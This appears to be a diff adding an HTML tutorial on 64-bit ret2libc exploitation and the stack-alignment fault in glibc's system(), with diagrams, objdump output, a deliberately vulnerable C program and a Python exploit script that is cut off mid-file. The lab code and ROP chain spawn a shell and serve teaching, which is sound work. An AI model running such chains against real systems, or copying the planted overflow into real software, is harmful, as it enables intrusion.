@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ret2libc &amp; the Stack Alignment Trap</title>
+<style>
+  :root {
+    --bg: #0d1117; --panel: #161b22; --panel2: #1c2333; --border: #30363d;
+    --fg: #e6edf3; --dim: #9aa7b3; --accent: #58a6ff; --green: #3fb950;
+    --red: #ff7b72; --orange: #ffa657; --purple: #bc8cff; --pink: #ff7bc6;
+    --yellow: #e3b341; --cyan: #39c5cf; --code-bg: #0b0f14;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; background: var(--bg); color: var(--fg);
+    font: 15px/1.55 -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  }
+  .wrap { max-width: 980px; margin: 0 auto; padding: 0 20px 70px; }
+  code, pre, .mono { font-family: "SFMono-Regular", "JetBrains Mono", Consolas, "Liberation Mono", Menlo, monospace; }
+  code { background: #21283b; color: #79c0ff; padding: 1px 5px; border-radius: 4px; font-size: .87em; }
+  pre {
+    background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px;
+    padding: 12px 14px; overflow-x: auto; font-size: 13px; line-height: 1.6;
+  }
+  pre code { background: none; padding: 0; color: #e6edf3; }
+  a { color: var(--accent); }
+
+  .hero {
+    background: linear-gradient(135deg, #101b33 0%, #1a1030 55%, #071a1a 100%);
+    border-bottom: 1px solid var(--border); padding: 44px 24px 34px; text-align: center;
+  }
+  .hero h1 {
+    margin: 0 0 8px; font-size: 38px; letter-spacing: -0.5px;
+    background: linear-gradient(90deg, #58a6ff, #bc8cff, #ff7bc6);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  .hero p { color: var(--dim); max-width: 740px; margin: 0 auto; font-size: 16px; }
+  .hero .tag {
+    display: inline-block; margin-top: 14px; padding: 4px 14px;
+    border: 1px solid #58a6ff55; border-radius: 999px; color: var(--accent); font-size: 12.5px; letter-spacing: 1px;
+  }
+
+  h2.sec {
+    display: flex; align-items: center; gap: 12px; margin: 46px 0 4px;
+    font-size: 22px; letter-spacing: -0.3px; border-bottom: 1px solid var(--border); padding-bottom: 8px;
+  }
+  h2.sec .n {
+    flex: none; width: 30px; height: 30px; border-radius: 8px; display: flex;
+    align-items: center; justify-content: center; font-weight: 800; font-size: 15px; color: #0d1117;
+  }
+  h2.sec .hint { color: var(--dim); font-weight: 400; font-size: 14px; margin-left: auto; }
+  .c1{background:var(--accent)} .c2{background:var(--orange)} .c3{background:var(--green)}
+  .c4{background:var(--yellow)} .c5{background:var(--purple)} .c6{background:var(--pink)}
+  .c7{background:var(--cyan)}
+
+  .panel {
+    background: var(--panel); border: 1px solid var(--border);
+    border-radius: 10px; padding: 4px 16px 12px; margin: 14px 0;
+  }
+  .panel h3 { font-size: 15px; margin: 12px 0 8px; color: #dbe6f1; letter-spacing: .2px; }
+  .panel h3 .hint { color: var(--dim); font-weight: 400; font-size: 12.5px; margin-left: 6px; }
+
+  table.ref { border-collapse: collapse; width: 100%; font-size: 13px; margin: 6px 0 8px; }
+  table.ref th {
+    background: #1d2534; color: var(--accent); text-align: left; padding: 6px 10px;
+    border: 1px solid var(--border); font-weight: 600;
+  }
+  table.ref td { padding: 6px 10px; border: 1px solid var(--border); vertical-align: top; }
+  table.ref tr:nth-child(even) { background: #131922; }
+  .muted { color: var(--dim); }
+  .ok { color: var(--green); font-weight: 700; }
+  .bad { color: var(--red); font-weight: 700; }
+
+  .callout {
+    border-left: 3px solid var(--yellow); background: #191d13aa; border-radius: 0 8px 8px 0;
+    padding: 9px 14px; margin: 10px 0; font-size: 13.5px; color: #d8e0c9;
+  }
+  .callout.blue { border-color: var(--accent); background: #12233c88; color: #cfe0f5; }
+  .callout.pink { border-color: var(--pink); background: #2a153088; color: #f2d6ea; }
+  .callout.green { border-color: var(--green); background: #11261a88; color: #d3ecd9; }
+  .callout.red { border-color: var(--red); background: #2d151888; color: #f5d5d3; }
+  .callout b { color: #fff; }
+
+  .svgbox { margin: 20px 0 4px; text-align: center; }
+  .svgbox svg { max-width: 100%; height: auto; }
+  .cap { color: var(--dim); font-size: 12px; margin-top: 4px; font-style: italic; }
+
+  .toc { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin: 26px 0 6px; }
+  .toc a {
+    text-decoration: none; font-size: 12.5px; padding: 5px 11px; border-radius: 999px;
+    background: #161b22; border: 1px solid var(--border); color: var(--dim);
+  }
+  .toc a:hover { border-color: var(--accent); color: var(--accent); }
+
+  .footer { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); color: var(--dim); font-size: 13px; }
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <h1>ret2libc &amp; the Stack Alignment Trap</h1>
+  <p>Your chain is perfect, <code>rdi</code> points at <code>"/bin/sh"</code>, and the process still dies &#8212; inside <code>system()</code>, on a <code>movaps</code>. One extra <code>ret</code> gadget fixes it. This page explains why, with the arithmetic and a working demo.</p>
+  <div class="tag">LINUX &#183; x86-64 &#183; SYSTEM V ABI &#183; GLIBC 2.39</div>
+</div>
+
+<div class="wrap">
+
+<div class="toc">
+  <a href="#why">1 &#183; Why ret2libc</a>
+  <a href="#chain">2 &#183; The 64-bit chain</a>
+  <a href="#rule">3 &#183; The ABI rule</a>
+  <a href="#glibc">4 &#183; Inside do_system</a>
+  <a href="#fix">5 &#183; The one-qword fix</a>
+  <a href="#lab">6 &#183; Lab</a>
+  <a href="#debug">7 &#183; Debug checklist</a>
+</div>
+
+<h2 class="sec" id="why"><span class="n c1">1</span> Why ret2libc exists <span class="hint">NX killed shellcode, not control flow</span></h2>
+
+<p>A stack overflow gives you one thing: the saved return address. In the 1990s you filled the buffer with shellcode and returned <i>into the buffer</i>. Then every OS marked the stack non-executable (<code>NX</code> / <code>DEP</code>, visible as <code>GNU_STACK RW</code> in <code>readelf -lW</code>), and that payload stopped working &#8212; the bytes are still there, the CPU just refuses to execute them.</p>
+
+<p>Nothing stops you from returning into code that is <b>already executable</b>. libc is mapped into every process and contains, among 2000+ functions, <code>system()</code>. So you stop supplying code and start supplying <b>addresses</b>: this is return-oriented programming, and <code>ret2libc</code> is its smallest useful instance.</p>
+
+<div class="svgbox">
+<svg viewBox="0 0 940 230" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system,'Segoe UI',Roboto,Arial,sans-serif">
+  <defs>
+    <marker id="a1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#9aa7b3"/>
+    </marker>
+  </defs>
+
+  <text x="235" y="26" text-anchor="middle" fill="#ff7b72" font-size="15" font-weight="800">classic shellcode &#8212; dead</text>
+  <rect x="60" y="44" width="350" height="56" fill="#2b1d10" stroke="#ffa657" stroke-width="1.5"/>
+  <text x="235" y="66" text-anchor="middle" fill="#ffa657" font-size="12.5" font-weight="700">stack: buffer full of shellcode</text>
+  <text x="235" y="86" text-anchor="middle" fill="#c9b8a4" font-size="11">saved RIP &#8594; address of the buffer</text>
+  <path d="M 235 104 L 235 130" stroke="#9aa7b3" stroke-width="1.5" marker-end="url(#a1)"/>
+  <rect x="120" y="134" width="230" height="40" fill="#2d1518" stroke="#ff7b72" stroke-width="1.5"/>
+  <text x="235" y="152" text-anchor="middle" fill="#ff7b72" font-size="12" font-weight="700">page is RW, not X</text>
+  <text x="235" y="167" text-anchor="middle" fill="#f0b4b0" font-size="10.5" font-family="'SFMono-Regular',Consolas,monospace">SIGSEGV on first byte</text>
+  <text x="235" y="205" text-anchor="middle" fill="#6e7a86" font-size="11" font-style="italic">the data is there, execution permission is not</text>
+
+  <line x1="470" y1="40" x2="470" y2="200" stroke="#30363d" stroke-dasharray="4 4"/>
+
+  <text x="705" y="26" text-anchor="middle" fill="#3fb950" font-size="15" font-weight="800">ret2libc &#8212; reuse what is already X</text>
+  <rect x="530" y="44" width="350" height="56" fill="#2b1d10" stroke="#ffa657" stroke-width="1.5"/>
+  <text x="705" y="66" text-anchor="middle" fill="#ffa657" font-size="12.5" font-weight="700">stack: just addresses (no code)</text>
+  <text x="705" y="86" text-anchor="middle" fill="#c9b8a4" font-size="11">saved RIP &#8594; a gadget, then &#8594; <tspan font-family="'SFMono-Regular',Consolas,monospace">system</tspan></text>
+  <path d="M 705 104 L 705 130" stroke="#9aa7b3" stroke-width="1.5" marker-end="url(#a1)"/>
+  <rect x="590" y="134" width="230" height="40" fill="#241536" stroke="#bc8cff" stroke-width="1.5"/>
+  <text x="705" y="152" text-anchor="middle" fill="#bc8cff" font-size="12" font-weight="700">libc .text &#8212; R+X since boot</text>
+  <text x="705" y="167" text-anchor="middle" fill="#cbb8e8" font-size="10.5" font-family="'SFMono-Regular',Consolas,monospace">execve("/bin/sh")</text>
+  <text x="705" y="205" text-anchor="middle" fill="#6e7a86" font-size="11" font-style="italic">NX is satisfied &#8212; and now the ABI starts to matter</text>
+</svg>
+<div class="cap">NX removes your ability to <i>introduce</i> code. It does not remove your ability to <i>re-order</i> code that already exists.</div>
+</div>
+
+<div class="callout blue">The moment you reuse real compiled functions, you inherit their assumptions. A function compiled by GCC assumes the System V ABI was honoured on entry. Your ROP chain is the caller now &#8212; and it is a sloppy one. <b>Stack misalignment is the first ABI contract people break.</b></div>
+
+<h2 class="sec" id="chain"><span class="n c2">2</span> The 64-bit chain <span class="hint">arguments are registers, so you need gadgets</span></h2>
+
+<p>On 32-bit x86 the arguments of a <code>cdecl</code> function sit <b>on the stack</b>, so a ret2libc payload is just three words: <code>&amp;system</code>, a fake return address, <code>&amp;"/bin/sh"</code>. On x86-64 the first six integer arguments live in <code>rdi, rsi, rdx, rcx, r8, r9</code> &#8212; the stack carries none of them. You cannot set a register by writing on the stack; you need an instruction that moves stack data into a register and then returns. That is a <b>gadget</b>:</p>
+
+<pre><code>pop rdi        ; 5f    &#8592; takes the next qword off your payload into rdi
+ret            ; c3    &#8592; and continues to the next entry of your payload</code></pre>
+
+<div class="svgbox">
+<svg viewBox="0 0 940 470" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system,'Segoe UI',Roboto,Arial,sans-serif">
+  <defs>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#9aa7b3"/>
+    </marker>
+    <marker id="arg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#3fb950"/>
+    </marker>
+  </defs>
+
+  <text x="20" y="245" fill="#9aa7b3" font-size="11" font-style="italic" text-anchor="middle" transform="rotate(-90 20 245)">higher addresses &#8593;</text>
+
+  <!-- ===== left: intact frame ===== -->
+  <text x="215" y="30" text-anchor="middle" fill="#e3b341" font-size="15" font-weight="800">frame of vuln(), intact</text>
+
+  <rect x="95" y="44" width="240" height="44" fill="#161b22" stroke="#30363d"/>
+  <text x="215" y="71" text-anchor="middle" fill="#9aa7b3" font-size="12">main()&#8217;s frame</text>
+
+  <rect x="95" y="88" width="240" height="34" fill="#12233c" stroke="#58a6ff" stroke-width="1.5"/>
+  <text x="215" y="110" text-anchor="middle" fill="#58a6ff" font-size="12" font-weight="700">saved RIP &#8594; back into main</text>
+
+  <rect x="95" y="122" width="240" height="30" fill="#0f2a2e" stroke="#39c5cf" stroke-width="1.5"/>
+  <text x="215" y="142" text-anchor="middle" fill="#39c5cf" font-size="12">saved RBP</text>
+
+  <rect x="95" y="152" width="240" height="110" fill="#2b1d10" stroke="#ffa657" stroke-width="1.5"/>
+  <text x="215" y="188" text-anchor="middle" fill="#ffa657" font-size="13" font-weight="700">char buf[64]</text>
+  <text x="215" y="208" text-anchor="middle" fill="#c9b8a4" font-size="10.5" font-family="'SFMono-Regular',Consolas,monospace">lea -0x40(%rbp),%rax</text>
+  <text x="215" y="226" text-anchor="middle" fill="#c9b8a4" font-size="10.5" font-family="'SFMono-Regular',Consolas,monospace">read(0, buf, 0x200)</text>
+  <text x="215" y="248" text-anchor="middle" fill="#6e7a86" font-size="10.5" font-style="italic">64 bytes asked, 512 accepted</text>
+
+  <path d="M 345 160 L 345 118" stroke="#ff7bc6" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="352" y="146" fill="#ff7bc6" font-size="10.5" font-style="italic">64 + 8 = 72 bytes to reach it</text>
+
+  <!-- ===== right: payload ===== -->
+  <text x="690" y="30" text-anchor="middle" fill="#3fb950" font-size="15" font-weight="800">the same frame, after 72 + 32 bytes</text>
+
+  <rect x="560" y="44" width="260" height="34" fill="#241536" stroke="#bc8cff" stroke-width="1.5"/>
+  <text x="690" y="60" text-anchor="middle" fill="#bc8cff" font-size="12" font-weight="700">&amp;system</text>
+  <text x="690" y="73" text-anchor="middle" fill="#cbb8e8" font-size="10" font-family="'SFMono-Regular',Consolas,monospace">libc + 0x58750</text>
+
+  <rect x="560" y="78" width="260" height="34" fill="#11261a" stroke="#3fb950" stroke-width="1.5"/>
+  <text x="690" y="94" text-anchor="middle" fill="#3fb950" font-size="12" font-weight="700">&amp;"/bin/sh"</text>
+  <text x="690" y="107" text-anchor="middle" fill="#a9cfb3" font-size="10" font-family="'SFMono-Regular',Consolas,monospace">popped into rdi</text>
+
+  <rect x="560" y="112" width="260" height="34" fill="#241536" stroke="#bc8cff" stroke-width="1.5"/>
+  <text x="690" y="128" text-anchor="middle" fill="#bc8cff" font-size="12" font-weight="700">&amp;(pop rdi ; ret)</text>
+  <text x="690" y="141" text-anchor="middle" fill="#cbb8e8" font-size="10" font-family="'SFMono-Regular',Consolas,monospace">libc + 0x10c08d</text>
+
+  <rect x="560" y="146" width="260" height="34" fill="#2b2313" stroke="#e3b341" stroke-width="2"/>
+  <text x="690" y="162" text-anchor="middle" fill="#e3b341" font-size="12" font-weight="700">&amp;(ret)  &#8592; the alignment fix</text>
+  <text x="690" y="175" text-anchor="middle" fill="#ddd0a0" font-size="10" font-family="'SFMono-Regular',Consolas,monospace">overwrites the saved RIP slot</text>
+
+  <rect x="560" y="180" width="260" height="30" fill="#2d1518" stroke="#ff7b72" stroke-width="1.5"/>
+  <text x="690" y="200" text-anchor="middle" fill="#ff7b72" font-size="11.5">8 &#215; 'A'  (was saved RBP)</text>
+
+  <rect x="560" y="210" width="260" height="90" fill="#2d1518" stroke="#ff7b72" stroke-width="1.5"/>
+  <text x="690" y="252" text-anchor="middle" fill="#ff7b72" font-size="12.5" font-weight="700">64 &#215; 'A'  (was buf)</text>
+  <text x="690" y="272" text-anchor="middle" fill="#f0b4b0" font-size="10.5" font-style="italic">padding only &#8212; no code lives here</text>
+
+  <!-- execution order arrows -->
+  <g stroke="#3fb950" stroke-width="1.6" fill="none">
+    <path d="M 830 163 C 880 163 880 129 836 129" marker-end="url(#arg)"/>
+    <path d="M 830 129 C 905 129 905 95 836 95" marker-end="url(#arg)"/>
+    <path d="M 830 95 C 880 95 880 61 836 61" marker-end="url(#arg)"/>
+  </g>
+  <text x="915" y="200" fill="#3fb950" font-size="11" font-style="italic" text-anchor="middle" transform="rotate(-90 915 200)">each ret walks rsp upward</text>
+
+  <!-- bottom explanation strip -->
+  <rect x="95" y="330" width="725" height="110" fill="#0b0f14" stroke="#30363d" rx="8"/>
+  <text x="115" y="354" fill="#58a6ff" font-size="12.5" font-weight="700">what the CPU does, one qword at a time</text>
+  <g font-family="'SFMono-Regular',Consolas,monospace" font-size="11.5" fill="#c9d1d9">
+    <text x="115" y="378">vuln's  ret   &#8594; pops &amp;(ret)         &#8594; rip = ret gadget</text>
+    <text x="115" y="396">ret           &#8594; pops &amp;(pop rdi)     &#8594; rip = pop rdi gadget   <tspan fill="#e3b341">(rsp moved 8: that is the whole trick)</tspan></text>
+    <text x="115" y="414">pop rdi       &#8594; pops &amp;"/bin/sh"    &#8594; rdi = "/bin/sh"</text>
+    <text x="115" y="432">ret           &#8594; pops &amp;system        &#8594; rip = system, with rsp 8 mod 16  <tspan fill="#3fb950">&#10003;</tspan></text>
+  </g>
+</svg>
+<div class="cap">Padding to the saved RIP is <code>sizeof(buf) + 8</code> = 72 here, because <code>buf</code> sits at <code>rbp-0x40</code> and the saved RBP is in between. The chain itself is four qwords.</div>
+</div>
+
+<h2 class="sec" id="rule"><span class="n c3">3</span> The ABI rule that bites <span class="hint">rsp + 8 must be a multiple of 16</span></h2>
+
+<p>The System V AMD64 ABI says the stack must be 16-byte aligned <b>immediately before a <code>call</code></b>. Since <code>call</code> pushes an 8-byte return address, the function sees:</p>
+
+<div class="callout green"><b>At every function entry point: <code>(rsp + 8) % 16 == 0</code></b>, i.e. <code>rsp % 16 == 8</code>. The prologue&#8217;s pushes and <code>sub</code> are sized by the compiler on that assumption, so that every 16-byte local &#8212; every <code>xmm</code> spill slot &#8212; lands on a 16-byte boundary.</div>
+
+<p>Why does any of this matter? Because of one instruction family. <code>movaps</code>/<code>movdqa</code> ("aligned packed single") <b>requires</b> its memory operand to be 16-byte aligned; a misaligned operand raises <code>#GP</code>, which the kernel delivers as <code>SIGSEGV</code>. The unaligned sibling <code>movups</code> would have been fine &#8212; but GCC emits the aligned form precisely because the ABI promised alignment.</p>
+
+<div class="panel">
+  <table class="ref">
+    <tr><th>Instruction</th><th>Alignment requirement</th><th>Where you meet it</th></tr>
+    <tr><td><code>movaps</code> / <code>movapd</code> / <code>movdqa</code></td><td><b>16 bytes, enforced</b> &#8594; <code>#GP</code> &#8594; <code>SIGSEGV</code></td><td><code>system()</code>, <code>printf()</code> float paths, <code>memcpy</code> variants, <code>_dl_runtime_resolve</code></td></tr>
+    <tr><td><code>movups</code> / <code>movdqu</code></td><td>none</td><td>what the compiler uses when it cannot prove alignment</td></tr>
+    <tr><td><code>vmovaps</code> (AVX, ymm)</td><td>32 bytes</td><td>AVX-optimised string functions</td></tr>
+  </table>
+  <div class="callout">The CPU does not care about <code>rsp</code> as such. It cares that the <b>effective address</b> <code>[rsp+0x50]</code> is a multiple of 16. <code>rsp</code> only matters because it is the base of every stack slot the function computed.</div>
+</div>
+
+<h2 class="sec" id="glibc"><span class="n c4">4</span> Inside do_system <span class="hint">the arithmetic, from a real libc</span></h2>
+
+<p><code>system()</code> on glibc is a thin wrapper: it rejects a NULL command and jumps to the real worker, <code>do_system</code>. Here is the local libc (Ubuntu 24.04, glibc 2.39), straight out of <code>objdump</code>:</p>
+
+<div class="panel">
+<pre><code>$ objdump -d --no-show-raw-insn /usr/lib/x86_64-linux-gnu/libc.so.6
+
+0000000000058750 &lt;__libc_system&gt;:
+   58750:  endbr64
+   58754:  test   %rdi,%rdi
+   58757:  je     58760
+   58759:  jmp    582d0            &lt;-- tail jump: rsp unchanged, alignment inherited
+
+00000000000582d0 &lt;do_system&gt;:
+   582d0:  push   %r13             &lt;-- 4 pushes = -0x20  (0x20 % 16 == 0)
+   582d2:  mov    $0x1,%edx
+   582d7:  push   %r12
+   582dc:  push   %rbp
+   582dd:  push   %rbx
+   582de:  sub    $0x388,%rsp      &lt;-- 0x388 % 16 == 8   &lt;&lt;&lt; the odd one
+   ...
+   5843b:  movaps %xmm0,0x50(%rsp) &lt;-- 0x50 % 16 == 0, so this inherits rsp's alignment</code></pre>
+</div>
+
+<p>Three numbers decide everything: <code>0x20</code> (neutral), <code>0x388</code> (shifts by 8), <code>0x50</code> (neutral). So the effective address of that <code>movaps</code> is congruent to <code>rsp_on_entry &#8722; 8</code> mod 16. It is aligned <b>only if <code>system</code> was entered with <code>rsp % 16 == 8</code></b> &#8212; exactly what the ABI promises and exactly what a naive ROP chain gets wrong.</p>
+
+<div class="svgbox">
+<svg viewBox="0 0 940 300" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system,'Segoe UI',Roboto,Arial,sans-serif">
+  <defs>
+    <marker id="ag" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#3fb950"/>
+    </marker>
+    <marker id="arr2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#ff7b72"/>
+    </marker>
+  </defs>
+
+  <text x="470" y="26" text-anchor="middle" fill="#e6edf3" font-size="14.5" font-weight="700">the same four instructions, two different entry alignments</text>
+
+  <!-- good track -->
+  <text x="78" y="88" text-anchor="middle" fill="#3fb950" font-size="12" font-weight="800">ABI-correct</text>
+  <g>
+    <rect x="130" y="60" width="130" height="46" rx="6" fill="#11261a" stroke="#3fb950" stroke-width="1.5"/>
+    <text x="195" y="79" text-anchor="middle" fill="#3fb950" font-size="12" font-weight="700">entry</text>
+    <text x="195" y="96" text-anchor="middle" fill="#d3ecd9" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">rsp % 16 = 8</text>
+
+    <rect x="310" y="60" width="130" height="46" rx="6" fill="#161b22" stroke="#30363d"/>
+    <text x="375" y="79" text-anchor="middle" fill="#9aa7b3" font-size="11.5">4 &#215; push</text>
+    <text x="375" y="96" text-anchor="middle" fill="#d3ecd9" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">= 8</text>
+
+    <rect x="490" y="60" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d"/>
+    <text x="565" y="79" text-anchor="middle" fill="#9aa7b3" font-size="11.5">sub $0x388</text>
+    <text x="565" y="96" text-anchor="middle" fill="#d3ecd9" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">= 0</text>
+
+    <rect x="690" y="60" width="210" height="46" rx="6" fill="#11261a" stroke="#3fb950" stroke-width="2"/>
+    <text x="795" y="79" text-anchor="middle" fill="#3fb950" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">movaps [rsp+0x50]</text>
+    <text x="795" y="96" text-anchor="middle" fill="#3fb950" font-size="11.5" font-weight="700">addr % 16 = 0 &#10003; shell</text>
+
+    <g stroke="#3fb950" stroke-width="1.6" fill="none">
+      <path d="M 262 83 L 304 83" marker-end="url(#ag)"/>
+      <path d="M 442 83 L 484 83" marker-end="url(#ag)"/>
+      <path d="M 642 83 L 684 83" marker-end="url(#ag)"/>
+    </g>
+  </g>
+
+  <!-- bad track -->
+  <text x="78" y="188" text-anchor="middle" fill="#ff7b72" font-size="12" font-weight="800">naive chain</text>
+  <g>
+    <rect x="130" y="160" width="130" height="46" rx="6" fill="#2d1518" stroke="#ff7b72" stroke-width="1.5"/>
+    <text x="195" y="179" text-anchor="middle" fill="#ff7b72" font-size="12" font-weight="700">entry</text>
+    <text x="195" y="196" text-anchor="middle" fill="#f5d5d3" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">rsp % 16 = 0</text>
+
+    <rect x="310" y="160" width="130" height="46" rx="6" fill="#161b22" stroke="#30363d"/>
+    <text x="375" y="179" text-anchor="middle" fill="#9aa7b3" font-size="11.5">4 &#215; push</text>
+    <text x="375" y="196" text-anchor="middle" fill="#f5d5d3" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">= 0</text>
+
+    <rect x="490" y="160" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d"/>
+    <text x="565" y="179" text-anchor="middle" fill="#9aa7b3" font-size="11.5">sub $0x388</text>
+    <text x="565" y="196" text-anchor="middle" fill="#f5d5d3" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">= 8</text>
+
+    <rect x="690" y="160" width="210" height="46" rx="6" fill="#2d1518" stroke="#ff7b72" stroke-width="2"/>
+    <text x="795" y="179" text-anchor="middle" fill="#ff7b72" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">movaps [rsp+0x50]</text>
+    <text x="795" y="196" text-anchor="middle" fill="#ff7b72" font-size="11.5" font-weight="700">addr % 16 = 8 &#10007; #GP</text>
+
+    <g stroke="#ff7b72" stroke-width="1.6" fill="none">
+      <path d="M 262 183 L 304 183" marker-end="url(#arr2)"/>
+      <path d="M 442 183 L 484 183" marker-end="url(#arr2)"/>
+      <path d="M 642 183 L 684 183" marker-end="url(#arr2)"/>
+    </g>
+  </g>
+
+  <rect x="130" y="236" width="770" height="48" rx="8" fill="#0b0f14" stroke="#30363d"/>
+  <text x="150" y="256" fill="#e3b341" font-size="12" font-weight="700">the 8-byte question:</text>
+  <text x="150" y="274" fill="#c9d1d9" font-size="11.5" font-family="'SFMono-Regular',Consolas,monospace">#GP is raised, the kernel reports SIGSEGV at do_system+363 &#8212; not in your chain, not in your binary, deep inside libc.</text>
+</svg>
+<div class="cap">Offsets measured on glibc 2.39 (Ubuntu 24.04). The constants differ per version &#8212; the parity argument does not.</div>
+</div>
+
+<div class="panel">
+  <h3>The full ladder <span class="hint">rsp % 16 at every transfer, for both chains</span></h3>
+  <table class="ref">
+    <tr><th>what executes</th><th>naive chain</th><th>chain with an extra <code>ret</code></th></tr>
+    <tr><td><code>call vuln</code> in main &#8212; ABI point</td><td>0</td><td>0</td></tr>
+    <tr><td><code>vuln</code> entry (call pushed 8)</td><td>8</td><td>8</td></tr>
+    <tr><td><code>push rbp</code> / <code>sub $0x40</code></td><td>0</td><td>0</td></tr>
+    <tr><td><code>leave</code> &#8212; rsp now on the saved RIP slot</td><td>8</td><td>8</td></tr>
+    <tr><td><code>ret</code> &#8212; first chain entry runs</td><td>0</td><td>0</td></tr>
+    <tr><td><code>ret</code> gadget (the fix)</td><td class="muted">&#8212; not present &#8212;</td><td>8</td></tr>
+    <tr><td><code>pop rdi</code></td><td>8</td><td>0</td></tr>
+    <tr><td><code>ret</code> &#8594; <b>system entry</b></td><td class="bad">0 &#8212; wrong</td><td class="ok">8 &#8212; correct</td></tr>
+    <tr><td>&#8230; <code>movaps [rsp+0x50]</code></td><td class="bad">addr % 16 = 8 &#8594; SIGSEGV</td><td class="ok">addr % 16 = 0 &#8594; <code>/bin/sh</code></td></tr>
+  </table>
+</div>
+
+<h2 class="sec" id="fix"><span class="n c5">5</span> The one-qword fix <span class="hint">and why it is a ret and not a nop</span></h2>
+
+<p>You need to shift <code>rsp</code> by 8 somewhere before <code>system</code> begins. Any gadget that consumes one extra qword will do, but a bare <code>ret</code> is the ideal one: it is one byte (<code>c3</code>), it exists in every binary and every library, it touches no register, and it costs exactly one slot in your payload.</p>
+
+<div class="panel">
+  <table class="ref">
+    <tr><th>Gadget</th><th>Effect on <code>rsp</code></th><th>Side effects</th></tr>
+    <tr><td><code>ret</code></td><td>+8 per use</td><td>none &#8212; the clean choice</td></tr>
+    <tr><td><code>pop rax ; ret</code> (any unused reg)</td><td>+8</td><td>clobbers that register; eats a payload qword as data</td></tr>
+    <tr><td><code>add rsp, 8 ; ret</code></td><td>+8</td><td>none; also eats a qword</td></tr>
+    <tr><td><code>nop ; ret</code></td><td class="bad">0</td><td class="muted">useless &#8212; a nop does not move <code>rsp</code>. Alignment is about <code>rsp</code>, not about time.</td></tr>
+  </table>
+  <div class="callout pink"><b>Parity, not position.</b> One extra <code>ret</code> anywhere before the call flips the chain from wrong to right; two extra <code>ret</code>s put you back where you started. If the payload already happens to be aligned, adding one <b>breaks</b> it. The rule is &#8220;make <code>rsp % 16 == 8</code> at the entry of the libc function&#8221;, not &#8220;always add a ret&#8221;.</div>
+</div>
+
+<div class="callout blue">Finding one: <code>ropper --file ./vuln --search "ret"</code>, <code>ROPgadget --binary ./vuln --only "ret"</code>, or by hand &#8212; any <code>c3</code> byte inside an executable segment. Gadgets are byte patterns, not instructions the compiler emitted, so <code>c3</code> in the middle of a longer instruction works just as well. A linear <code>objdump</code> will not show you those.</div>
+
+<h2 class="sec" id="lab"><span class="n c6">6</span> Lab <span class="hint">reproduced on glibc 2.39, both outcomes</span></h2>
+
+<div class="panel">
+  <h3>The target <span class="hint">NX on, canary off, non-PIE, leak handed to you</span></h3>
+<pre><code>// vuln.c &#8212; gcc -fno-stack-protector -no-pie -O0 -o vuln vuln.c
+#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;unistd.h&gt;
+
+char cmd[] = "/bin/sh";
+
+void vuln(void) { char buf[64]; read(0, buf, 512); }        // 512 into 64
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("system=%p  binsh=%p\n", dlsym(RTLD_DEFAULT, "system"), (void *)cmd);
+    vuln();
+    return 0;
+}</code></pre>
+  <div class="callout">The program prints the runtime address of <code>system</code> so that ASLR is out of the picture &#8212; this page is about alignment, not about leaking. In a real target that line is your info-leak primitive, and everything below is unchanged.</div>
+</div>
+
+<div class="panel">
+  <h3>The exploit <span class="hint">one flag switches the alignment</span></h3>
+<pre><code>#!/usr/bin/env python3
+import re, struct, subprocess, sys, time
+
+ALIGN = (len(sys.argv) &lt; 2) or (sys.argv[1] == "align")
+
+SYSTEM_OFF  = 0x58750    # __libc_system   | glibc 2.39, Ubuntu 24.04
+POP_RDI_OFF = 0x10c08d   # pop rdi ; ret   | byte pattern 5f c3
+RET_OFF     = 0x28a92    # ret             | byte pattern c3
+
+p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE,
+                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+m = re.search(r"system=(0x[0-9a-f]+)\s+binsh=(0x[0-9a-f]+)",
+              p.stdout.readline().decode())
+system, binsh = int(m.group(1), 16), int(m.group(2), 16)
+base = system - SYSTEM_OFF
+
+q = lambda v: struct.pack("&lt;Q", v)
+chain  = q(base + RET_OFF) if ALIGN else b""     # &lt;-- the whole lesson
+chain += q(base + POP_RDI_OFF) + q(binsh) + q(system)
+
+p.stdin.write(b"A" * 72 + chain + b"\n"); p.stdin.flush()
+time.sleep(0.3)                                  # let the shell come up
